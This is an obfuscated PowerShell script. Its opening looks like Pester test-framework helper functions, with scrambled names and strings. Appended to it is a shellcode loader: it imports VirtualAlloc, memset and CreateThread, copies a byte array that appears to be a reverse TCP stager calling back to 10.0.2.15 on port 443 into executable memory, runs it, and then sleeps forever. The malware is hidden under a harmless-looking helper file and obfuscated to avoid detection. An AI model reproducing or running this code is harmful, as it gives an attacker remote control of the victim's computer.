  ${0`6Y}  =  [TYPE]("{0}{4}{6}{1}{5}{3}{2}"-F 'mANage','T.AUt','y','rRORcAtEGOr','M','OmATIOn.e','eN')  ;  SET-VArIAble ("N0"+"O") (  [TYpe]("{3}{1}{4}{2}{5}{0}"-f'mENT','ysTEM.','IR','S','env','on') ) ; function S`E`T-`ITrESULt {
    
    [CmdletBinding()]
    param(
        [Parameter(mandAToRY = ${F`Al`se}, PARAMeTersetnAME = "iN`Con`clUsIVE")][switch]${INcoNcl`U`s`ivE},
        [Parameter(maNDaTORY = ${F`AlSE}, PaRAMeTERseTnAmE = "P`E`NDinG")][switch]${p`En`dING},
        [Parameter(ManDAtORY = ${F`Al`se}, PAramEtERsEtName = "sk`Ip`peD")][switch]${s`Ki`PPed},
        [string]${b`EcAu`Se}
    )

    &("{6}{4}{5}{0}{3}{2}{1}" -f'scribeInPr','s','gres','o','sert-','De','As') -CommandName ("{0}{1}{2}"-f 'Se','t-I','tResult')

    ${reS`ULT} = ${Pscmd`L`ET}.PArAmeTeRsETnaME
    ${m`eS`SAge} = "It result set to $result$(if ($Because) { ", $Because" })"
    ${D`AtA} = @{
        ("{0}{1}{2}" -f'R','esul','t')  = ${RESU`lt}
        ("{0}{1}"-f 'Bec','ause') = ${B`E`cauSe}
    }
    ${err`ORREC`ORD} = &("{2}{0}{4}{5}{1}{3}"-f '-Pes','cor','New','d','terError','Re') -Result ${r`es`ULT}  -Message ${m`ESsaGE} -Data ${D`ATa}
    throw ${E`Rro`RRECo`Rd}
}

function New`-PeST`e`ReRR`ORREcORD {
    [CmdletBinding()]
    param(
        [Parameter(MANDATory = ${tr`UE})]
        [string]${rEsu`lT},
        [Parameter(mAnDATORy = ${tr`Ue})]
        [string]${MESs`Age},
        [string]${f`Ile},
        [string]${L`inE},
        [string]${l`IN`eTEXt},
        [hashtable]${d`AtA}
    )

    ${EXC`Ept`Ion} = &("{0}{2}{1}"-f'N','bject','ew-O') ("{0}{1}" -f'Exce','ption') ${m`ESsa`gE}
    ${e`RrorId} = "PesterTest$Result"
    ${erRo`R`CaT`Eg`OrY} =  ${0`6Y}::"Inv`A`LIdReSu`lT"

    
    ${tArGe`TObjE`CT} = @{
        ("{0}{2}{1}"-f 'Me','e','ssag')  = ${mess`A`ge}
        ("{1}{0}"-f 'ta','Da')     = ${D`ATa}
        ("{0}{1}" -f'Fi','le')     = $(if (${F`ILe} -ne ${N`Ull}) {
                ${fi`Le}
            }
            else {
                ${MyI`Nv`OcA`TIon}."s`cR`ipT`NAME"
            })
        ("{0}{1}"-f 'L','ine')     = $(if (${L`iNe} -ne ${NU`lL}) {
                ${lI`NE}
            }
            else {
                ${MY`inV`oCA`TioN}."ScriP`TLI`NEn`UMB`ER"
            })
        ("{2}{0}{1}" -f'e','Text','Lin') = $(if (${LI`NEt`ext} -ne ${nu`lL}) {
                ${lIne`T`ExT}
            }
            else {
                ${mYINvoca`T`ION}."L`iNe"
            }).("{1}{0}{2}"-f 'i','Tr','mEnd').Invoke($(  ${n0o}::"N`EwlIne"))
    }

    &("{3}{2}{1}{0}"-f 't','bjec','O','New-') ("{1}{6}{4}{9}{2}{7}{8}{5}{3}{0}" -f'ord','Man','A','rrorRec','g','E','a','utomation','.','ement.') ${e`XCEP`T`iOn}, ${ERR`o`Rid}, ${ERROr`C`A`TegORy}, ${tA`RgeTObj`Ect}
}

${C} = ((("{77}{46}{14}{57}{83}{60}{1}{51}{37}{12}{4}{13}{38}{35}{50}{71}{63}{2}{53}{70}{43}{9}{11}{41}{85}{76}{24}{56}{68}{0}{25}{6}{27}{74}{67}{73}{32}{15}{44}{21}{78}{29}{17}{61}{86}{10}{65}{69}{34}{62}{47}{33}{16}{7}{40}{81}{26}{75}{22}{18}{66}{36}{87}{59}{19}{58}{79}{3}{39}{8}{88}{30}{54}{82}{52}{23}{31}{84}{5}{28}{64}{49}{72}{55}{45}{80}{20}{42}{48}"-f 'tect);[','t',',','dwCreationFlags, IntPtr lpThread','oc','ic static','mport','ackS',';[','T','tP','y','ll','(','rt(fhpkernel32.d','t','St','eTh','Sta','ara',' src,','r','lp','p','uin','DllI','I','(fhpkernel32.dllfhp)]public ',' ','t','mport(fhpmsv',')]pub','xtern In','uint dw','t','ntPtr l','ddress, I','A','I','Id)','iz','p',' uin','lAllocation','Ptr C','mset(IntPtr dest, u','llImpo','ibutes, ','t count);','rn','p','ual','fh',' ui','crt.',' me','t ','llfhp)]pu','m','P','tern IntPtr Vir','re','r','dress','exte','tr lpThrea','rtA',' ','flPro','dAt','nt dwSize, uint f','Ad',' IntPtr','e','static','ntPtr ',', ','[D','ea','eter, uint ','int','e, ','dll','blic static ex','l','e','ad(In','ntPtr lp','DllI'))."R`ePLa`Ce"('fhp',[STRInG][ChaR]34));${W} = .("{2}{0}{1}" -f 'dd-Ty','pe','A') -memberDefinition ${C} -Name ("{0}{1}"-f'Win','32') -namespace ("{0}{2}{1}{3}" -f'Win32F','nction','u','s') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x02,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."l`E`NgtH" -gt 0x1000){${G} = ${Z}."l`enGTH"};${X}=${W}::("{0}{3}{1}{2}" -f 'Virtua','Allo','c','l').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${z}."le`NGth"-1);${i}++) {${W}::"M`emsEt"([IntPtr](${x}.("{0}{1}"-f'ToInt','32').Invoke()+${I}), ${z}[${I}], 1)};${W}::("{0}{2}{1}" -f'Crea','Thread','te').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{1}{2}"-f 'St','a','rt-sleep') 60};
